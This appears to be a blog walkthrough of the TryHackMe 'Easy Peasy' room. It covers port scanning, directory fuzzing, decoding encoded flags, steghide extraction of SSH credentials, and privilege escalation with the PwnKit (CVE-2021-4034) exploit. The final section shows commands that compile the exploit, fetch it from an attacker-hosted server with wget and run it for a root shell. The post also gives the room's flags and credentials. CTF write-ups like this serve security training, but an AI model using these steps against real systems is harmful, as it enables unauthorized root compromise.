---
title: 'TryHackMe - Easy Peasy'
author: r2cook
categories: [TryHackMe]
tags: [ Steganography, base64, base62, md5, ROT13, PrivEsc, pkexec, PwnKit]
render_with_liquid: false
media_subpath: /images/thm/Easy-Peasy/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **Easy Peasy** machine by combining **multi-service enumeration, recursive content discovery, layered decoding challenges, steganographic analysis, secure-shell foothold acquisition, and Linux privilege escalation**, progressing through multiple hidden clues to achieve full root compromise and recover every flag.

# Initial Setup

Add the target host to `/etc/hosts`:

```plaintext
10.128.185.82 easy.thm
```
{: file="/etc/hosts" }

---

# Enumeration

## Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN nmap_full_scan.txt easy.thm
```
{: .nolineno }

## Scan Results

```text
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
65524/tcp open  http    Apache httpd 2.4.43
```

### Key Findings

- **Port 80 → nginx**
    
- **Port 6498 → SSH**
    
- **Port 65524 → Apache**
    
- Both web services expose `robots.txt`
    

---

# Web Enumeration — Port 80

![](Image_1.png){: width="800" height="400" .shadow }

## Directory Fuzzing

```shell
ffuf -u http://easy.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-e .php,.txt,.bak,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

![](Image_2.png){: width="800" height="400" .shadow }

This reveals:

```text
/hidden
```

![](Image_3.png){: width="800" height="400" .shadow }

![](Image_4.png){: width="800" height="400" .shadow }

---

## Recursive Fuzzing

```shell
ffuf -u http://easy.thm/hidden/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-e .php,.txt,.bak,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

![](Image_5.png){: width="800" height="400" .shadow }

Found:

```text
/whatever
```

![](Image_6.png){: width="800" height="400" .shadow }

![](Image_7.png){: width="800" height="400" .shadow }

---

## Flag 1

Page source contains a hidden Base64 string:

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

Decode it:

```shell
echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
```
{: .nolineno }

Result:

```text
flag{f1rs7_fl4g}
```

---

# Web Enumeration — Port 65524

Now move to the Apache service:

![](Image_8.png){: width="800" height="400" .shadow }

## Directory Fuzzing

```shell
ffuf -u http://easy.thm:65524/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-e .php,.txt,.bak,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

![](Image_11.png){: width="800" height="400" .shadow }

Found:

```text
/robots.txt
```

![](Image_13.png){: width="800" height="400" .shadow }

Inside:

```text
User-Agent:a18672860d0510e5ab6699730763b250
```

This is an **MD5 hash**, and it directly reveals **Flag 2**:

![](Image_14.png){: width="800" height="400" .shadow }

```text
flag{1m_s3c0nd_fl4g}
```

---

# Hidden Source Code Data

Viewing page source reveals two important findings.

## Encoded Directory Path

```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

![](Image_9.png){: width="800" height="400" .shadow }
![](Image_12.png){: width="800" height="400" .shadow }

After decoding the Base62-style string:

```text
/n0th1ng3ls3m4tt3r
```

We’ll investigate this shortly.

---

## Flag 3

Another hidden line in the source contains:

```text
Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

![](Image_10.png){: width="800" height="400" .shadow }

---

# Steganography

Navigate to:

```text
/n0th1ng3ls3m4tt3r
```

![](Image_15.png){: width="800" height="400" .shadow }

View source:

![](Image_16.png){: width="800" height="400" .shadow }

Found:

```html
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
```

This appears to be a **SHA-256 hash**.

The page also references an image:

```text
binarycodepixabay.jpg
```

Download it:

```shell
wget http://easy.thm:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```
{: .nolineno }

Try extracting hidden data:

```shell
steghide extract -sf binarycodepixabay.jpg
```
{: .nolineno }

but asking for passphrase !


![](Image_17.png){: width="800" height="400" .shadow }


The extracted hash resolves to the passphrase:

```text
mypasswordforthatjob
```

Run again:

```shell
steghide extract -sf binarycodepixabay.jpg
```
{: .nolineno }

Enter the passphrase:

```text
mypasswordforthatjob
```

Output:

```text
wrote extracted data to "secrettext.txt".
```

![](Image_18.png){: width="800" height="400" .shadow }

---

## Extracted Credentials

The file contains:

- Username: `boring`
    
- Password: binary encoded text
    

After converting binary → ASCII:

```text
iconvertedmypasswordtobinary
```

---

# Initial Access

Use SSH on the **non-standard port 6498**:

```shell
ssh boring@easy.thm -p 6498
```
{: .nolineno }

Credentials:

```text
boring:iconvertedmypasswordtobinary
```

![](Image_20.png){: width="800" height="400" .shadow }

---

# User Flag

The `user.txt` contents are ROT13 encoded:

```text
synt{a0jvgf33zfa0ez4y}
```

Decode:

```shell
echo 'synt{a0jvgf33zfa0ez4y}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
{: .nolineno }

Result:

```text
flag{n0wits33msn0rm4l}
```


---

# Privilege Escalation  (PrivEsc)

## SUID Enumeration

```shell
find / -perm /4000 -type f 2>/dev/null
```
{: .nolineno }

Interesting binary:

```text
/usr/bin/pkexec
```

Check version:

```shell
/usr/bin/pkexec --version
```
{: .nolineno }

Output:

```text
pkexec version 0.105
```

This version is vulnerable to:

> **CVE-2021-4034 — PwnKit**

---

# Exploitation — PwnKit

## Compile Exploit

```shell
gcc -shared pwnkit.c -o PwnKit -Wl,-e,entry -fPIC
```
{: .nolineno }

## Host Locally

```shell
python3 -m http.server 8000
```
{: .nolineno }

## Download on Target

```shell
wget http://YOUR_IP:8000/PwnKit
chmod +x PwnKit
```
{: .nolineno }

## Execute

```shell
./PwnKit
```
{: .nolineno }

## Result

Root shell obtained.

![](Image_21.png){: width="800" height="400" .shadow }


---

# Root Flag

```text
flag{63a9f0ea7bb98050796b649e85481845}
```

---